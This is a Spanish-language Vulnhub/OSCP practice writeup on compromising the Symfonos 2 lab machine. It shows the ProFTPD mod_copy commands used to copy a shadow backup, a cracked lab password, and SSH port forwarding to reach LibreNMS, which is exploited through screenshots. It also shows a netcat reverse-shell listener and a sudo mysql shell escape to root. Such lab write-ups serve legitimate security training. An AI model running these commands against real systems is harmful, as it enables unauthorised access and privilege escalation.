---
title: Symfonos2 Writeup - Vulnhub
date: 2025-02-27
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Symfonos2, OSCP Prep, FTP, LibreNMS]
image:
  path: /assets/img/commons/vulnhub/symfonos2/portada.png
---

Anterior [*OSCP Lab 12*](https://lvs3c.github.io/posts/OSCP-digitalworld.torment/)

¡Saludos!

**`OSCP Lab 13`**

En este writeup, realizaremos la máquina [**Symfonos 2**](https://www.vulnhub.com/entry/symfonos-2,331/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Explotar servicio ProFTPd** obteniendo archivo shadow.
- **John** para crackear los hashes.
- **Port Forwarding** mediante `SSH`{: .filepath} para exponer un servicio interno.
- **Vulnerar LibreNMS** software para monitoreo de red, obteniendo **User Pivoting**.
- Y por último, tenemos permisos sobre `mysql`{: .filepath}, con lo cual podemos convertirnos en root y obtener las flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.27     00:0c:29:bd:2a:67       VMware, Inc.
10.11.12.200    00:50:56:e3:e2:d6       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.506 seconds (102.15 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.27
PING 10.11.12.27 (10.11.12.27) 56(84) bytes of data.
64 bytes from 10.11.12.27: icmp_seq=1 ttl=64 time=0.416 ms

--- 10.11.12.27 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.416/0.416/0.416/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.27 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 12:05 -03
Nmap scan report for 10.11.12.27
Host is up (0.0020s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:BD:2A:67 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.54 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p21,22,80,139,445 -sCV 10.11.12.27 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 12:08 -03
Nmap scan report for 10.11.12.27
Host is up (0.00054s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: webfs/1.21
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:BD:2A:67 (VMware)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2025-02-27T09:08:33-06:00
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2025-02-27T15:08:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.92 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `ProFTPD 1.3.5`.
- Puerto `22` servidor `OpenSSH 7.4p1`.
- Puerto `80` servidor `WebFS httpd 1.21`.
- Puerto `139` servidor `Samba 3.X`.
- Puerto `445` servidor `Samba 4.5.16-Debian`.


### FTP - 21 | SMB - 445

`FTP`{: .filepath} nos pide credenciales, no tenemos acceso como usuario `anonymous`{: .filepath} ni `ftp`{: .filepath}.

Usando `smbmap` observamos que tenemos permiso para listar directorios compartidos, encontramos un archivo de logs.

```bash
❯ smbmap -H 10.11.12.27
[+] Guest session       IP: 10.11.12.27:445     Name: 10.11.12.27
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)
❯ smbmap -H 10.11.12.27 -r anonymous/
[+] Guest session       IP: 10.11.12.27:445     Name: 10.11.12.27
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        anonymous                                               READ ONLY
        .\anonymous\*
        dr--r--r--                0 Thu Feb 27 13:24:18 2025    .
        dr--r--r--                0 Thu Jul 18 11:29:08 2019    ..
        dr--r--r--                0 Thu Jul 18 11:25:17 2019    backups
❯ smbmap -H 10.11.12.27 -r anonymous/backups
[+] Guest session       IP: 10.11.12.27:445     Name: 10.11.12.27
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        anonymous                                               READ ONLY
        .\anonymousbackups\*
        dr--r--r--                0 Thu Jul 18 11:25:17 2019    .
        dr--r--r--                0 Thu Feb 27 13:24:18 2025    ..
        fr--r--r--            11394 Thu Jul 18 11:25:16 2019    log.txt
```

Descargamos el archivo `log.txt` y encontramos una copia del archivo `shadow` en el directorio `/var/backups` y la ruta de la carpeta compartida.

![log](/assets/img/commons/vulnhub/symfonos2/log.png){: .normal }

![share](/assets/img/commons/vulnhub/symfonos2/share.png){: .normal }

Lo que procede ahora es copiarnos el archivo shadow, para validar si existe algún password para crackear.

Copiamos mediante `ftp`{: .filepath}, usando el método a continuación hacia la carpeta compartida, a la que tenemos acceso.

![ftpcp](/assets/img/commons/vulnhub/symfonos2/ftpcp.png){: .center-image }

```bash
❯ telnet 10.11.12.27 21
Trying 10.11.12.27...
Connected to 10.11.12.27.
Escape character is '^]'.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.11.12.27]
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

Descargamos usando `smbmap`.

```bash
❯ smbmap -H 10.11.12.27 --download anonymous/shadow.bak
[+] Starting download: anonymous\shadow.bak (1173 bytes)
[+] File output to: /home/lvs3c/CTF/VulnHub/Symfonos2/10.11.12.27/scans/10.11.12.27-anonymous_shadow.b
```

![shadow](/assets/img/commons/vulnhub/symfonos2/shadow.png){: .center-image }


## Explotación

---

Procedemos a crackear los hashes con `hydra`, encontrando la clave del usuario `aeolus`.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sergioteamo      (aeolus)
```

Ingresamos por ssh.

```bash
❯ ssh aeolus@10.11.12.27
The authenticity of host '10.11.12.27 (10.11.12.27)' can't be established.
ED25519 key fingerprint is SHA256:bVM6iESUngv842ilwZ5pthpPxRaIrgL4RxNNbnBFssQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.12.27' (ED25519) to the list of known hosts.
aeolus@10.11.12.27's password:
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
aeolus@symfonos2:~$
```

## Escalación de privilegios

---

Verificando los puertos internos, observamos el puerto 8080 que corre internamente un webserver, bajo el usuario `cronus`.

![apache](/assets/img/commons/vulnhub/symfonos2/apache.png){: .center-image }
![8080](/assets/img/commons/vulnhub/symfonos2/8080.png){: .center-image }

Generamos por SSH la conexión mediante port forwarding.

![portfowarding](/assets/img/commons/vulnhub/symfonos2/portfowarding.png){: .center-image }

Observamos un panel de administración, usamos las credenciales de aeolus e ingresamos a `LibreNMS`.

![nms](/assets/img/commons/vulnhub/symfonos2/nms.png){: .center-image }

Buscando por searchsploit, encontramos que es vulnerable al agregar un nuevo dispositivo sobre el campo `community`{: .filepath} de `SNMP`, donde inyectaremos nuestro código.

![search](/assets/img/commons/vulnhub/symfonos2/search.png){: .center-image }
![script](/assets/img/commons/vulnhub/symfonos2/script.png){: .center-image }

![nms0](/assets/img/commons/vulnhub/symfonos2/nms0.png){: .center-image }
![nms1](/assets/img/commons/vulnhub/symfonos2/nms1.png){: .center-image }

Nos ponemos en escucha y lanzamos la prueba de SNMP.

![run](/assets/img/commons/vulnhub/symfonos2/run.png){: .center-image }

Somos el usuario `cronus`{: .filepath}, tenemos permiso de root sobre `mysql`, buscamos por gtfobins y ejecutamos el comando, somos root y listamos la flag.

```bash
❯ sudo rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.27] 47664
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
cronus@symfonos2:/opt/librenms/html$

cronus@symfonos2:/opt/librenms/html$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql

cronus@symfonos2:/opt/librenms/html$ sudo /usr/bin/mysql -e '\! /bin/sh'
sudo /usr/bin/mysql -e '\! /bin/sh'
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

        Contact me via Twitter @zayotic to give feedback!

#
```

Hope it helps!
